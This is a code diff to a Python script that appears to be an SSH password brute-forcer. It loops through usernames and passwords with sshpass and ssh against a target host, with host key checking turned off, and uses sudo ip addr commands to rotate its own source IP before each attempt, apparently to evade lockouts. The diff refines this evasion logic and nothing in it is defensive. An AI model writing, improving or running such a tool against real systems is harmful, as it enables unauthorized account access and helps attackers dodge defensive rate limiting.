@@ -6,8 +6,15 @@ def set_Values():
     global network_Interface
     network_Interface = str(input("Please enter the Network Interface: "))
     global host_IP
-    host_IP = subprocess.call(['ip','a','|','grep',network_Interface])
-    print(host_IP)
+    host_IP = str(input("Please enter the Source IP: "))
+
+
+def format_SourceIP():
+    global source_IP
+    source_IPs = host_IP.split('.')
+    source_IP = source_IPs[:-1]
+    source_IP = '.'.join(source_IP)
+    source_IP = source_IP + '.'
 
 def make_IP_List():
     global ips
@@ -30,24 +37,17 @@ def get_Users():
 def run_Attack():
     ip_index = 0
     passwd_index = 0
+    subprocess.call(['sudo', 'ip', 'addr', 'delete', host_IP + '/24', 'dev', network_Interface])
     while passwd_index < len(passwds):
         for user in users:
             for ps in passwds:
                 print(user,':', ps)
-                subprocess.call(['sshpass','-p', ps,'ssh','-o','stricthostkeychecking=no', user + '@' + target_IP])
                 ip = ips[ip_index]
                 old_ip = ip - 1
-                subprocess.call(['sudo', 'ip', 'addr', 'add', host_IP + str(ip) + '/24', 'dev', network_Interface])
-                subprocess.call(['sudo', 'ip', 'addr', 'delete', host_IP + str(old_ip) + '/24', 'dev', network_Interface])
+                subprocess.call(['sudo', 'ip', 'addr', 'add', source_IP + str(ip) + '/24', 'dev', network_Interface])
+                subprocess.call(['sudo', 'ip', 'addr', 'delete', source_IP + str(old_ip) + '/24', 'dev', network_Interface])
+                subprocess.call(['sshpass','-p', ps,'ssh','-o','stricthostkeychecking=no', user + '@' + target_IP])
                 ip_index += 1
                 if ip_index >= len(ips):
                     ip_index = 0
-                passwd_index += 1
-
-# def run_Attack():
-#     ip_index = 0
-#     passwd_index = 0
-#     while passwd_index < len(passwds):
-#         for user in users:
-#             for pwd in passwds:
-#                 print("Trying ", user, ":", pwd)        
+                passwd_index += 1      
